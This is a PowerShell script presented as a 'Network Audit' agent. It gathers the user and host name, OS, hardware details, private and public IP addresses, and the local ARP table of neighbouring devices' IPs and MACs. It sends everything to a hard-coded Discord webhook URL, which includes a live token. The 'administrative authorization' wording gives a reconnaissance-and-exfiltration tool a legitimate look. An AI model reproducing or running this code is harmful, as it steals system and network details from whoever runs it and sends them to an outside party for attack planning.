$webhookUrl = "https://discord.com/api/webhooks/1508286656573083719/GdHbeeuWYaw2vo9CGL-ptMmGgRfV2GBAFgsWBWMY7THjhKhtA122dNsKqKs9th9QtmCH"

# 1. Gather Advanced Hardware & OS Metrics
$osInfo    = Get-CimInstance Win32_OperatingSystem
$osName    = $osInfo.Caption
$pcName    = $env:COMPUTERNAME
$user      = $env:USERNAME
$ram       = "$([Math]::Round((Get-CimInstance Win32_PhysicalMemory | Measure-Object Capacity -Sum).Sum / 1GB)) GB"
$cpuName   = (Get-CimInstance Win32_Processor).Name
$uptimeSpan = (Get-Date) - $osInfo.LastBootUpTime
$uptime     = "$($uptimeSpan.Days)d $($uptimeSpan.Hours)h $($uptimeSpan.Minutes)m"

# 2. Gather Network Interface Details
$ipList = Get-NetIPAddress -AddressFamily IPv4 | 
    Where-Object {$_.IPAddress -notlike "127*" -and $_.InterfaceAlias -notlike "*Loopback*"} | 
    Select-Object InterfaceAlias, IPAddress

$privateIPs = ""
foreach ($ip in $ipList) {
    $privateIPs += "• **$($ip.InterfaceAlias):** `$($ip.IPAddress)`\n"
}
if ([string]::IsNullOrEmpty($privateIPs)) { $privateIPs = "No active interfaces." }

# Resolve Public Gateway IP safely
$publicIP = "Unknown (Offline)"
try { $publicIP = (Invoke-RestMethod -Uri "https://ifconfig.me" -TimeoutSec 3).Trim() } catch {}

# 3. Network Device Discovery (ARP/Neighbor Table Scan)
# This grabs active reachable devices on the local network subnet
$neighborDevices = Get-NetNeighbor -AddressFamily IPv4 | 
    Where-Object { $_.State -in @('Reachable', 'Permanent', 'Stale') -and $_.IPAddress -notlike '224*' -and $_.IPAddress -notlike '255*' -and $_.IPAddress -notlike '169.254*' } |
    Select-Object IPAddress, LinkLayerAddress | 
    Sort-Object IPAddress

$networkMap = ""
foreach ($dev in $neighborDevices) {
    $networkMap += "• `$($dev.IPAddress)` -> `$($dev.LinkLayerAddress)`\n"
}

# Trim output if there are too many network devices for a Discord message
if ([string]::IsNullOrEmpty($networkMap)) { 
    $networkMap = "No other network devices detected in cache." 
} elseif ($networkMap.Length -gt 900) {
    $networkMap = $networkMap.Substring(0, 900) + "... (Truncated due to length)"
}

$timestamp = (Get-Date).ToString("yyyy-MM-ddTHH:mm:ssZ")

# 4. Construct the Expanded JSON Payload
$jsonPayload = @"
{
  "embeds": [
    {
      "title": "📊 Network Audit & Diagnostics Report",
      "description": "Comprehensive environment audit compiled under administrative authorization.",
      "color": 2067276, 
      "fields": [
        {
          "name": "👤 Identity & Status",
          "value": "**User:** `$user` on `$pcName`\n**OS:** $osName\n**Uptime:** $uptime",
          "inline": false
        },
        {
          "name": "⚙️ Hardware Specifications",
          "value": "**CPU:** $cpuName\n**Total RAM:** $ram",
          "inline": false
        },
        {
          "name": "🌐 Host Interfaces",
          "value": "**Public Routing IP:** `$publicIP`\n**Private Interfaces:**\n$privateIPs",
          "inline": false
        },
        {
          "name": "📡 Discovered Network Neighbors (IP -> MAC Address)",
          "value": "$networkMap",
          "inline": false
        }
      ],
      "footer": {
        "text": "Inventory & Network Audit Agent v2.5"
      },
      "timestamp": "$timestamp"
    }
  ]
}
"@

# 5. Transmit Payload via Secure HTTP POST
try {
    $bytes = [System.Text.Encoding]::UTF8.GetBytes($jsonPayload)
    Invoke-RestMethod -Uri $webhookUrl -Method Post -Body $bytes -ContentType "application/json; charset=utf-8"
    Write-Host "Network audit data transmitted successfully." -ForegroundColor Green
} catch {
    Write-Error "Transmission failure: $_"
}
